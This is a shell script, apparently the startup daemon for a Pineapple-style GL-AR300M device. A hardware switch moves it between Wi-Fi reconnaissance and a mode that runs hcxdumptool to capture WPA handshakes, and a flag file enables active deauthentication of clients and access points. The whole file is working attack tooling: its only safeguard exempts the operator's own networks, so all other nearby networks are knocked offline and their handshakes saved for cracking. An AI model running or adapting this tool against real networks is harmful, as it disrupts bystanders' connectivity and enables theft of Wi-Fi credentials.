#!/bin/sh
# Shadow-Apple hardware-switch mode daemon.
#   Switch FULL-LEFT = RECON only                         green LED
#   Switch RIGHT     = DEAUTH + HANDSHAKE CAPTURE         red LED
# Boot FOLLOWS the switch (RIGHT boots straight into deauth). The only override is a
# rapid-reboot bootloop guard: 3+ boots in quick succession -> hold recon until the
# switch is cycled LEFT->RIGHT, so a genuine wedge-loop self-heals while a normal
# reboot always honours the switch position.
# Deauth is PASSIVE by default; `touch /sd/bot/deauth-active` enables full active
# deauth (needs adequate USB power -- see docs/POWER-MOD.md).
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
LOG=/sd/bot/switch.log
HCXFILTER=/sd/bot/hcx-protect.list
OUT=/sd/handshakes
PIDF=/tmp/bot-mode.pid
BOOTC=/sd/bot/.bootcount
RLED=/sys/class/leds/gl-ar300m:red:wlan/brightness
GLED=/sys/class/leds/gl-ar300m:green:system/brightness
led(){ for t in /sys/class/leds/gl-ar300m:*/trigger; do echo none > "$t" 2>/dev/null; done
  case "$1" in
    recon)  echo 0   > $RLED 2>/dev/null; echo 255 > $GLED 2>/dev/null;;
    deauth) echo 255 > $RLED 2>/dev/null; echo 0   > $GLED 2>/dev/null;;
  esac; }
gval(){ grep "button $1" /sys/kernel/debug/gpio 2>/dev/null | grep -oE ' (lo|hi)' | tr -d ' ' | head -1; }
read_pos(){ [ "$(gval left)" = "hi" ] && echo LEFT || echo RIGHT; }
have(){ command -v "$1" >/dev/null 2>&1; }
tmo(){ if have timeout; then timeout "$@"; else shift; "$@"; fi; }   # busybox timeout guard
stop_all(){
  [ -f $PIDF ] && kill "$(cat $PIDF)" 2>/dev/null; rm -f $PIDF
  pkill hcxdumptool 2>/dev/null; killall mdk3 2>/dev/null
  pineap /tmp/pineap.conf stop_scan >/dev/null 2>&1
  pineap /tmp/pineap.conf unpause   >/dev/null 2>&1
  sleep 4; }
start_recon(){ led recon
  ( while true; do
      pineap /tmp/pineap.conf run_scan 60 2 >/dev/null 2>&1
      W=0; while [ $W -lt 75 ]; do pineap /tmp/pineap.conf get_status 2>/dev/null | grep scanRunning | grep -q true || break; sleep 5; W=$((W+5)); done
    done ) & echo $! > $PIDF; }
# returns 0 if capture started (or an intentional recon-protect fallback), 1 if the
# monitor vif isn't ready yet so the caller should retry (don't latch the mode).
start_deauth(){
  /sd/bot/wl-refresh.sh >/dev/null 2>&1
  # SAFETY: protected SSIDs configured but filter empty -> don't attack our own nets.
  if [ -s /sd/bot/protect-ssids.conf ] && [ ! -s "$HCXFILTER" ]; then
    echo "$(date) REFUSING deauth: protected SSIDs configured but filter empty -> recon" >> $LOG
    start_recon; return 0
  fi
  led deauth
  pineap /tmp/pineap.conf stop_scan >/dev/null 2>&1
  pineap /tmp/pineap.conf pause     >/dev/null 2>&1
  sleep 4
  # reuse pineapd's monitor vif; only create one if absent (airmon time-guarded).
  if ! iw dev 2>/dev/null | grep -q wlan1mon; then
    tmo 25 airmon-ng start wlan1 >/dev/null 2>&1
    iw dev 2>/dev/null | grep -q wlan1mon || iw dev wlan1 interface add wlan1mon type monitor >/dev/null 2>&1
    sleep 2
  fi
  MON=wlan1mon; iw dev 2>/dev/null | grep -q wlan1mon || MON=wlan1
  ip link set "$MON" up 2>/dev/null
  if ! iw dev "$MON" info 2>/dev/null | grep -q monitor; then
    echo "$(date) deauth: monitor not ready yet -> will retry" >> $LOG
    return 1
  fi
  FILT=""; [ -s "$HCXFILTER" ] && FILT="--filterlist_ap=$HCXFILTER --filtermode=1"
  # PASSIVE dumper by default (no injection, cannot wedge). deauth-active flag -> full
  # client+AP deauth (only safe with adequate USB power; see docs/POWER-MOD.md).
  ATK="--disable_client_attacks --disable_ap_attacks"; MODEWORD="PASSIVE capture"
  [ -f /sd/bot/deauth-active ] && { ATK=""; MODEWORD="ACTIVE deauth (client+AP)"; }
  TS=$(date +%Y%m%d_%H%M%S)
  echo "$(date) hcx $MODEWORD on $MON (protect $([ -s "$HCXFILTER" ] && wc -l < "$HCXFILTER" || echo 0) BSSIDs)" >> $LOG
  /sd/usr/sbin/hcxdumptool -i "$MON" -o "$OUT/capture_$TS.pcapng" $FILT $ATK --enable_status=3 >> "$OUT/hcx-status.log" 2>&1 &
  HP=$!; echo $HP > $PIDF
  ( sleep 8; kill -0 "$HP" 2>/dev/null || { echo "$(date) hcx exited early -> recon LED" >> $LOG; led recon; } ) &
  return 0
}
mount | grep -q '/sys/kernel/debug' || mount -t debugfs none /sys/kernel/debug 2>/dev/null
echo "$(date) switch-mode daemon start" >> $LOG
# ---- bootloop guard: count only FRESH boots (low uptime); a manual restart on a
#      running system doesn't count. 3+ rapid reboots -> hold recon. Counter resets
#      once the unit has stayed up 5 min (= not a loop). ----
UP=$(cut -d. -f1 /proc/uptime 2>/dev/null); UP=${UP:-999}
FORCE_RECON=0
if [ "$UP" -lt 120 ]; then
  n=$(cat "$BOOTC" 2>/dev/null); n=$(( ${n:-0} + 1 )); echo "$n" > "$BOOTC"
  ( sleep 300; echo 0 > "$BOOTC" 2>/dev/null ) &
  if [ "$n" -ge 3 ]; then
    FORCE_RECON=1
    echo "$(date) boot #$n: rapid-reboot bootloop guard -> recon until switch cycled LEFT->RIGHT" >> $LOG
  else
    echo "$(date) boot #$n: following switch position" >> $LOG
  fi
else
  echo "$(date) manual restart (up ${UP}s): following switch position" >> $LOG
fi
rm -f /sd/bot/.deauth_pending 2>/dev/null   # legacy failsafe flag, retired
led recon
# short settle: wait for pineapd's monitor (wlan1mon) so RIGHT can enter deauth cleanly
i=0; while [ $i -lt 20 ] && ! iw dev 2>/dev/null | grep -q wlan1mon; do sleep 2; i=$((i+1)); done
CUR=""; PEND=""; STABLE=0
while true; do
  P=$(read_pos)
  if [ "$FORCE_RECON" = 1 ]; then
    if [ "$P" = "LEFT" ]; then FORCE_RECON=0; else P=LEFT; fi   # cleared by visiting LEFT
  fi
  if [ "$P" = "$PEND" ]; then STABLE=$((STABLE+1)); else PEND="$P"; STABLE=1; fi
  if [ "$STABLE" -ge 2 ] && [ "$P" != "$CUR" ]; then
    echo "$(date) -> $P (left=$(gval left))" >> $LOG
    stop_all
    if [ "$P" = RIGHT ]; then
      if start_deauth; then CUR="$P"; else CUR=""; sleep 3; fi   # retry if monitor not ready
    else
      start_recon; CUR="$P"
    fi
  fi
  sleep 3
done
